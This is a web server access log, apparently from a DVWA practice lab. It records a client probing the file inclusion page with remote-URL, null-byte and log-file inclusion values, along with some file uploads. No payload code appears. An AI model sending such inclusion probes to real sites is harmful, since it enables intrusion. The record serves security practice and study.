192.168.0.32 - - [17/Feb/2022:12:37:08 -0500] "GET /dvwa/ HTTP/1.1" 200 1632 "http://192.168.0.101/dvwa/vulnerabilities/fi/?page=inde.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:37:14 -0500] "GET /dvwa/vulnerabilities/fi/?page=include.php HTTP/1.1" 200 1250 "http://192.168.0.101/dvwa/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.101 - - [17/Feb/2022:12:37:21 -0500] "GET /dvwa/.php HTTP/1.0" 404 207 "-" "-"
192.168.0.32 - - [17/Feb/2022:12:37:21 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/.php HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.101 - - [17/Feb/2022:12:37:25 -0500] "GET /dvwa/ HTTP/1.0" 302 - "-" "-"
192.168.0.101 - - [17/Feb/2022:12:37:25 -0500] "GET /dvwa//login.php HTTP/1.0" 200 1224 "-" "-"
192.168.0.32 - - [17/Feb/2022:12:37:25 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/ HTTP/1.1" 200 1328 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:37:25 -0500] "GET /dvwa/vulnerabilities/fi/dvwa/css/login.css HTTP/1.1" 404 200 "http://192.168.0.101/dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:37:25 -0500] "GET /dvwa/vulnerabilities/fi/dvwa/images/login_logo.png HTTP/1.1" 404 209 "http://192.168.0.101/dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:37:31 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/%00 HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:37:39 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa%00 HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.101 - - [17/Feb/2022:12:38:02 -0500] "GET /dvwa\\0 HTTP/1.0" 404 204 "-" "-"
192.168.0.32 - - [17/Feb/2022:12:38:02 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa\\0 HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:39:25 -0500] "GET /dvwa/vulnerabilities/fi/?page=access.log HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:39:30 -0500] "GET /dvwa/vulnerabilities/fi/?page=access.log%00 HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:39:34 -0500] "GET /dvwa/vulnerabilities/fi/?page=access.log%2500 HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:39:39 -0500] "GET /dvwa/vulnerabilities/fi/?page=access.log\\0 HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:39:41 -0500] "GET /dvwa/vulnerabilities/sqli/ HTTP/1.1" 200 1343 "http://192.168.0.101/dvwa/vulnerabilities/fi/?page=access.log\\0" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:39:46 -0500] "GET /dvwa/vulnerabilities/fi/?page=include.php HTTP/1.1" 200 1250 "http://192.168.0.101/dvwa/vulnerabilities/sqli/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.101 - - [17/Feb/2022:12:39:53 -0500] "GET /dvwa/vulnerabilities/sqli/ HTTP/1.0" 302 - "-" "-"
192.168.0.101 - - [17/Feb/2022:12:39:53 -0500] "GET /dvwa/vulnerabilities/sqli//../../login.php HTTP/1.0" 404 228 "-" "-"
192.168.0.32 - - [17/Feb/2022:12:39:53 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/vulnerabilities/sqli/ HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:39:58 -0500] "GET /dvwa/setup.php HTTP/1.1" 200 1229 "http://192.168.0.101/dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/vulnerabilities/sqli/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:39:58 -0500] "GET /dvwa/setup.php HTTP/1.1" 200 1229 "http://192.168.0.101/dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/vulnerabilities/sqli/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:39:59 -0500] "GET /dvwa/dvwa/images/spanner.png HTTP/1.1" 200 716 "http://192.168.0.101/dvwa/setup.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:40:04 -0500] "GET /dvwa/vulnerabilities/fi/?page=include.php HTTP/1.1" 200 1250 "http://192.168.0.101/dvwa/setup.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.101 - - [17/Feb/2022:12:40:07 -0500] "GET /dvwa/setup.php HTTP/1.0" 200 3672 "-" "-"
192.168.0.32 - - [17/Feb/2022:12:40:07 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/setup.php HTTP/1.1" 200 1540 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:40:08 -0500] "GET /dvwa/vulnerabilities/fi/dvwa/css/main.css HTTP/1.1" 404 199 "http://192.168.0.101/dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/setup.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:40:08 -0500] "GET /dvwa/vulnerabilities/fi/dvwa/js/dvwaPage.js HTTP/1.1" 404 200 "http://192.168.0.101/dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/setup.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:40:08 -0500] "GET /dvwa/vulnerabilities/fi/dvwa/images/logo.png HTTP/1.1" 404 203 "http://192.168.0.101/dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/setup.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:40:08 -0500] "GET /dvwa/vulnerabilities/fi/dvwa/images/spanner.png HTTP/1.1" 404 203 "http://192.168.0.101/dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/setup.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:40:08 -0500] "GET /dvwa/vulnerabilities/fi/favicon.ico HTTP/1.1" 404 200 "http://192.168.0.101/dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/setup.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:40:13 -0500] "GET /dvwa/vulnerabilities/fi/instructions.php HTTP/1.1" 404 199 "http://192.168.0.101/dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/setup.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:40:17 -0500] "GET /dvwa/vulnerabilities/fi/instructions.php HTTP/1.1" 404 199 "http://192.168.0.101/dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/setup.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:40:21 -0500] "GET /dvwa/vulnerabilities/fi/ HTTP/1.1" 200 1046 "http://192.168.0.101/dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/setup.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:40:23 -0500] "GET /dvwa/ HTTP/1.1" 200 1632 "http://192.168.0.101/dvwa/vulnerabilities/fi/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:40:23 -0500] "GET /dvwa/ HTTP/1.1" 200 1632 "http://192.168.0.101/dvwa/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:40:25 -0500] "GET /dvwa/instructions.php HTTP/1.1" 200 3330 "http://192.168.0.101/dvwa/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:40:25 -0500] "GET /dvwa/instructions.php HTTP/1.1" 200 3330 "http://192.168.0.101/dvwa/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:40:33 -0500] "GET /dvwa/vulnerabilities/upload/ HTTP/1.1" 200 1379 "http://192.168.0.101/dvwa/instructions.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:40:40 -0500] "GET /dvwa/vulnerabilities/fi/?page=include.php HTTP/1.1" 200 1250 "http://192.168.0.101/dvwa/vulnerabilities/upload/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.101 - - [17/Feb/2022:12:40:45 -0500] "GET /dvwa/vulnerabilities/upload/ HTTP/1.0" 302 - "-" "-"
192.168.0.101 - - [17/Feb/2022:12:40:45 -0500] "GET /dvwa/vulnerabilities/upload//../../login.php HTTP/1.0" 404 228 "-" "-"
192.168.0.32 - - [17/Feb/2022:12:40:45 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/vulnerabilities/upload/ HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.101 - - [17/Feb/2022:12:40:49 -0500] "GET /dvwa/vulnerabilities/upload HTTP/1.0" 301 257 "-" "-"
192.168.0.101 - - [17/Feb/2022:12:40:49 -0500] "GET /dvwa/vulnerabilities/upload/ HTTP/1.0" 302 - "-" "-"
192.168.0.101 - - [17/Feb/2022:12:40:49 -0500] "GET /dvwa/vulnerabilities/upload//../../login.php HTTP/1.0" 404 228 "-" "-"
192.168.0.32 - - [17/Feb/2022:12:40:49 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/vulnerabilities/upload HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.101 - - [17/Feb/2022:12:40:51 -0500] "GET /dvwa/vulnerabilities/upload\\ HTTP/1.0" 404 226 "-" "-"
192.168.0.32 - - [17/Feb/2022:12:40:51 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/vulnerabilities/upload\\ HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:40:55 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/vulnerabilities/upload%00 HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.101 - - [17/Feb/2022:12:40:58 -0500] "GET /dvwa/vulnerabilities/upload%0 HTTP/1.0" 400 226 "-" "-"
192.168.0.32 - - [17/Feb/2022:12:40:58 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/vulnerabilities/upload%0 HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:41:02 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/vulnerabilities/upload/%00 HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.101 - - [17/Feb/2022:12:41:05 -0500] "GET /dvwa/vulnerabilities/upload/%00 HTTP/1.0" 404 226 "-" "-"
192.168.0.32 - - [17/Feb/2022:12:41:05 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/vulnerabilities/upload/%2500 HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.101 - - [17/Feb/2022:12:41:10 -0500] "GET /dvwa/vulnerabilities/upload/\\ HTTP/1.0" 404 227 "-" "-"
192.168.0.32 - - [17/Feb/2022:12:41:10 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/vulnerabilities/upload/\\ HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:41:13 -0500] "GET /dvwa/vulnerabilities/upload/ HTTP/1.1" 200 1379 "http://192.168.0.101/dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/vulnerabilities/upload/\\" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:41:17 -0500] "POST /dvwa/vulnerabilities/upload/ HTTP/1.1" 200 1398 "http://192.168.0.101/dvwa/vulnerabilities/upload/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:41:23 -0500] "POST /dvwa/vulnerabilities/upload/ HTTP/1.1" 200 1398 "http://192.168.0.101/dvwa/vulnerabilities/upload/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:41:27 -0500] "GET /dvwa/vulnerabilities/fi/?page=include.php HTTP/1.1" 200 1250 "http://192.168.0.101/dvwa/vulnerabilities/upload/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.101 - - [17/Feb/2022:12:41:32 -0500] "GET /dvwa/vulnerabilities/upload/ HTTP/1.0" 302 - "-" "-"
192.168.0.101 - - [17/Feb/2022:12:41:32 -0500] "GET /dvwa/vulnerabilities/upload//../../login.php HTTP/1.0" 404 228 "-" "-"
192.168.0.32 - - [17/Feb/2022:12:41:32 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/vulnerabilities/upload/ HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:41:34 -0500] "GET /dvwa/vulnerabilities/fi/?page=include.php HTTP/1.1" 200 1250 "http://192.168.0.101/dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/vulnerabilities/upload/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:41:34 -0500] "GET /dvwa/vulnerabilities/fi/?page=include.php HTTP/1.1" 200 1250 "http://192.168.0.101/dvwa/vulnerabilities/fi/?page=include.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:41:49 -0500] "GET /dvwa/vulnerabilities/fi/?page=https://evenimentt.herokuapp.com/database_scheme.PNG HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:41:56 -0500] "GET /dvwa/vulnerabilities/fi/?page=https://images.unsplash.com/photo-1541963463532-d68292c34b19?ixlib=rb-1.2.1&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=1080&fit=max HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:42:12 -0500] "GET /dvwa/vulnerabilities/fi/?page=https://images.unsplash.com/photo-1541963463532-d68292c34b19?ixlib=rb-1.2.1&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=1080&fit=max HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:42:15 -0500] "GET /dvwa/vulnerabilities/captcha/ HTTP/1.1" 200 1571 "http://192.168.0.101/dvwa/vulnerabilities/fi/?page=https://images.unsplash.com/photo-1541963463532-d68292c34b19?ixlib=rb-1.2.1&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=1080&fit=max" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:42:15 -0500] "GET /dvwa/vulnerabilities/captcha/ HTTP/1.1" 200 1571 "http://192.168.0.101/dvwa/vulnerabilities/fi/?page=https://images.unsplash.com/photo-1541963463532-d68292c34b19?ixlib=rb-1.2.1&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=1080&fit=max" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:42:16 -0500] "GET /dvwa/vulnerabilities/fi/?page=include.php HTTP/1.1" 200 1250 "http://192.168.0.101/dvwa/vulnerabilities/captcha/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:42:20 -0500] "GET /dvwa/vulnerabilities/fi/?page=https://evenimentt.herokuapp.com/index1.php HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:42:23 -0500] "GET /dvwa/vulnerabilities/view_source.php?id=fi&security=low HTTP/1.1" 200 698 "http://192.168.0.101/dvwa/vulnerabilities/fi/?page=https://evenimentt.herokuapp.com/index1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:42:23 -0500] "GET /dvwa/dvwa/css/source.css HTTP/1.1" 200 170 "http://192.168.0.101/dvwa/vulnerabilities/view_source.php?id=fi&security=low" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:59:49 -0500] "GET /dvwa/vulnerabilities/view_source.php?id=fi&security=low HTTP/1.1" 200 698 "http://192.168.0.101/dvwa/vulnerabilities/fi/?page=include.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:13:01:46 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://hiderefer.com/?http://en.wikipedia.org/wiki/Remote_File_Inclusion.php HTTP/1.1" 200 1846 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:13:02:15 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://hiderefer.com/?http://en.wikipedia.org/wiki/Remote_File_Inclusion.php HTTP/1.1" 200 1847 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:13:02:23 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://hiderefer.com/?http://en.wikipedia.org/wiki/Remote_File_Inclusion HTTP/1.1" 200 1790 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:13:02:35 -0500] "GET /dvwa/ HTTP/1.1" 200 1632 "http://192.168.0.101/dvwa/vulnerabilities/fi/?page=include.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:13:02:41 -0500] "GET /dvwa/vulnerabilities/fi/?page=include.php HTTP/1.1" 200 1250 "http://192.168.0.101/dvwa/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.101 - - [17/Feb/2022:13:02:45 -0500] "GET /dvwa/ HTTP/1.0" 302 - "-" "-"
192.168.0.101 - - [17/Feb/2022:13:02:45 -0500] "GET /dvwa//login.php HTTP/1.0" 200 1224 "-" "-"
192.168.0.32 - - [17/Feb/2022:13:02:45 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/ HTTP/1.1" 200 1328 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:13:02:45 -0500] "GET /dvwa/vulnerabilities/fi/dvwa/css/login.css HTTP/1.1" 404 200 "http://192.168.0.101/dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:13:02:45 -0500] "GET /dvwa/vulnerabilities/fi/dvwa/images/login_logo.png HTTP/1.1" 404 209 "http://192.168.0.101/dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:13:02:50 -0500] "GET /dvwa/vulnerabilities/view_source.php?id=fi&security=low HTTP/1.1" 200 698 "http://192.168.0.101/dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.101 - - [17/Feb/2022:13:03:27 -0500] "GET /dvwa/dvwa/images/logo.png HTTP/1.0" 200 6749 "-" "-"
192.168.0.32 - - [17/Feb/2022:13:03:27 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/dvwa/images/logo.png HTTP/1.1" 200 8034 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.101 - - [17/Feb/2022:13:03:40 -0500] "GET /dvwa/dvwa/images/logo.png HTTP/1.0" 200 6749 "-" "-"
192.168.0.32 - - [17/Feb/2022:13:03:40 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/dvwa/images/logo.png HTTP/1.1" 200 8034 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:13:03:44 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/dvwa/images/logo.png%00 HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.101 - - [17/Feb/2022:13:03:49 -0500] "GET /dvwa/dvwa/images/logo.png\\ HTTP/1.0" 404 224 "-" "-"
192.168.0.32 - - [17/Feb/2022:13:03:49 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/dvwa/images/logo.png\\ HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.101 - - [17/Feb/2022:13:03:52 -0500] "GET /dvwa/dvwa/images/logo.png\\0 HTTP/1.0" 404 225 "-" "-"
